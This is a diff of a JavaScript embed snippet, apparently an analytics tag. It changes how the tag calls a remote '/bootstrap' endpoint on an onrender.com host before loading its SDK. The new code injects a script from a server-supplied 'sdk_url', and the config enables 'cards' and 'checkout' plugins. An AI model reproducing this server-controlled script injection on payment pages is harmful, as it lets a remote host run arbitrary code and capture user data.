@@ -16,54 +16,35 @@
 
   q.push(["config", {"collectUrl":"https://collect-api-yzug.onrender.com/collect","plugins":{"cards":true,"ads":true,"search":true,"checkout":true}}]);
 
-  function deriveApiBase(collectUrl) {
-    try {
-      var u = String(collectUrl || "");
-      // remove trailing /collect or /collect/
-      u = u.replace(/\/collect\/?$/i, "");
-      return u;
-    } catch (e) {
-      return "";
-    }
-  }
+  // ✅ Gate download via Collect API bootstrap
+  var BOOT = "https://collect-api-yzug.onrender.com" + "/bootstrap"
+    + "?pid=" + encodeURIComponent("1e03c4df-d487-4ab5-bd89-15b72b2e5d8a")
+    + "&v=" + encodeURIComponent("0.2.2")
+    + "&cb=" + encodeURIComponent(base);
 
-  function loadSdk() {
+  function loadSdk(sdkUrl) {
     var d = document;
     var s = d.createElement("script");
     s.async = true;
-    s.src = base + "/core/sdk.min.js?pid=" + encodeURIComponent("1e03c4df-d487-4ab5-bd89-15b72b2e5d8a") + "&v=" + encodeURIComponent("0.2.2");
+    s.src = sdkUrl || (base + "/core/sdk.min.js?pid=" + encodeURIComponent("1e03c4df-d487-4ab5-bd89-15b72b2e5d8a") + "&v=" + encodeURIComponent("0.2.2"));
     var h = d.getElementsByTagName("script")[0];
     h.parentNode.insertBefore(s, h);
   }
 
-  // ✅ Gate: call /bootstrap
   try {
-    var cfg = {"collectUrl":"https://collect-api-yzug.onrender.com/collect","plugins":{"cards":true,"ads":true,"search":true,"checkout":true}};
-    var apiBase = deriveApiBase(cfg.collectUrl);
-    var boot = apiBase ? (apiBase + "/bootstrap?pid=" + encodeURIComponent("1e03c4df-d487-4ab5-bd89-15b72b2e5d8a")) : "";
-
-    if (!boot) {
-      // no api base => do not load sdk (safe)
-      return;
-    }
-
-    // Use fetch gate. If allow=true => load sdk
-    w.fetch(boot, { method: "GET", mode: "cors", credentials: "omit" })
-      .then(function (r) {
-        if (!r || !r.ok) throw new Error("bootstrap_not_ok");
-        return r.json();
-      })
+    fetch(BOOT, { method: "GET", credentials: "omit", cache: "no-store" })
+      .then(function (r) { return r && r.ok ? r.json() : { allow: false }; })
       .then(function (j) {
         if (j && j.allow === true) {
-          loadSdk();
+          loadSdk(j.sdk_url || null);
         } else {
-          // denied => do not load sdk
+          // Not allowed => do nothing (no SDK download)
         }
       })
       .catch(function () {
-        // error => do not load sdk (safe default)
+        // If bootstrap fails => safest is do nothing (no SDK download)
       });
   } catch (e) {
-    // error => do not load sdk
+    // If fetch not available => do nothing
   }
 })();
